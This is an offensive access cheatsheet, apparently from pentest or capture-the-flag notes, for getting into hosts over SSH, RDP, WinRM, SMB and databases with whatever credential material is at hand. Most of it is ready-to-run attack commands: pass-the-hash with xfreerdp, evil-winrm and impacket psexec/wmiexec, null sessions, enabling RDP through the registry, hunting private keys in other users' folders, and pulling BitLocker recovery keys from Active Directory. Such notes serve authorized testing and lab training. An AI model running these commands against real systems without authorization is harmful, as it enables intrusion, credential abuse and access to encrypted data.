---
topic: remote-access
tags: [access, ssh, rdp, winrm, smb, bitlocker, credentials]
---

# Getting in: by service and by what you hold

**English** | [🇪🇸 Español](remote-access.md)

> Access cheatsheet. First decide **what you have** (nothing, password, hash, key, ticket) and **which service is open**; the command follows.

## Decision table

| I have | SSH | RDP | WinRM | SMB | DB |
|---|---|---|---|---|---|
| Password | `ssh u@host` | `xfreerdp` | `evil-winrm -p` | `smbclient -U u%p` | `mysql -u -p` |
| NTLM hash only | ✗ (try key auth) | `xfreerdp /pth:HASH` | `evil-winrm -H HASH` | `psexec.py -hashes :H` | ✗ |
| Private key | `ssh -i key u@host` | — | — | — | tunnel |
| No credentials | banner / passwordless `root` | — | — | null session | passwordless `redis` |
| Kerberos ticket | — | — | `-r` with ticket | `-k -no-pass` | — |

## SSH

```bash
ssh user@host
ssh -i id_rsa user@host                       # key
chmod 600 id_rsa                              # if it complains about permissions
ssh -J user@jump user@internal                # ProxyJump
ssh -L 8080:127.0.0.1:8080 user@host          # local tunnel
ssh -R 9001:127.0.0.1:9001 user@host          # reverse tunnel
ssh -D 1080 user@host                         # SOCKS
scp -r file user@host:/tmp/                   # copy
sshfs user@host:/ /mnt/remote                 # mount
```

If only a key is accepted and you do not have it: look for `id_rsa` in `/proc`, backups, other users' `.ssh` with loose permissions, or a heap dump/config.

## RDP (Windows)

```bash
xfreerdp /v:host /u:user /p:'pass' /cert:ignore /dynamic-resolution
xfreerdp /v:host /u:user /pth:NTHASH /cert:ignore /admin   # restricted admin
xfreerdp /v:host /drive:share,/home/kali/share             # move files
```

- Enable RDP with admin rights: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f` plus the firewall rule.
- Sessions: `qwinsta`, `tscon <id> /dest:<session>` as SYSTEM.

## WinRM

```bash
evil-winrm -i host -u user -p 'pass'
evil-winrm -i host -u user -H NTHASH
evil-winrm -i host -u user -p 'pass' -s /scripts -e /exes    # upload/download
```

Ports 5985 (HTTP) and 5986 (HTTPS). Alternatives: `winrs -r:host cmd`, or `wmiexec.py`.

## SMB

```bash
smbclient -L //host -N                        # null session
smbclient //host/share -U 'user%pass'
impacket-psexec domain/user:pass@host
impacket-wmiexec domain/user@host -hashes :HASH
nxc smb host -u user -p pass --shares --sessions
```

## Databases and unauthenticated services

```bash
mysql -h host -u root -p'' -e 'select 1'
psql "host=host user=postgres password=pass dbname=postgres"
redis-cli -h host            # info; keys *; 6379 with no auth
impacket-mssqlclient user:pass@host -windows-auth
ftp anonymous@host           # anonymous FTP
telnet host                  # sometimes root with no password
```

## BitLocker: the recovery key

When a volume is encrypted and you cannot read what is inside (`user.txt`, `NTDS.dit`, a backup), what you need is the **recovery key**, not brute force.

Detect:

```powershell
manage-bde -status
Get-BitLockerVolume
Get-BitLockerVolume -MountPoint D: | Select-Object MountPoint,ProtectionStatus,KeyProtector
```

Where it usually lives (keys are backed up to AD for domain machines):

```powershell
Get-ADObject -Filter 'ObjectClass -eq "msFVE-RecoveryInformation"' `
  -SearchBase (Get-ADComputer <HOST>).DistinguishedName `
  -Properties msFVE-RecoveryPassword

Get-ADObject -LDAPFilter '(objectClass=msFVE-RecoveryInformation)' -Properties msFVE-RecoveryPassword |
  Select-Object Name,msFVE-RecoveryPassword
```

```bash
ldapsearch -x -H ldap://<DC> -D 'user@dom.htb' -w 'pass' \
  -b 'DC=dom,DC=htb' '(objectClass=msFVE-RecoveryInformation)' msFVE-RecoveryPassword
```

Other sources: GPO, deployment scripts, Intune/Entra, config files, mail in the profile, and `AD` backups (`ntds.dit`). For a mounted backup volume, the key may sit in the share's own `README`.

Use it:

```powershell
manage-bde -unlock D: -RecoveryPassword <48-DIGIT-KEY>
manage-bde -status D:
manage-bde -protectors -disable C:          # lab only
```

Offline (volume mounted on Linux, e.g. a `.vhd`):

```bash
mkdir -p /mnt/bde
dislocker -V /dev/sdb1 -p<KEY> -- /mnt/bde      # -p = recovery password
mount -o loop /mnt/bde/dislocker-file /mnt/win
```

## Rules that save hours

- A hash works for WinRM/SMB with *restricted admin*, **not** for SSH.
- A key works for SSH, not for RDP (unless you can inject it into `authorized_keys`).
- An open 22 with modern SSH will not accept `root:root`: try the password on other users.
- If `ssh` fails with "Permission denied (publickey)" and you have a password, force `password` auth.
- BitLocker is not broken, it is read: find the key where the system stored it.

## References

- <https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/recovery/>
- <https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html>
- <https://github.com/Hackplayers/evil-winrm>
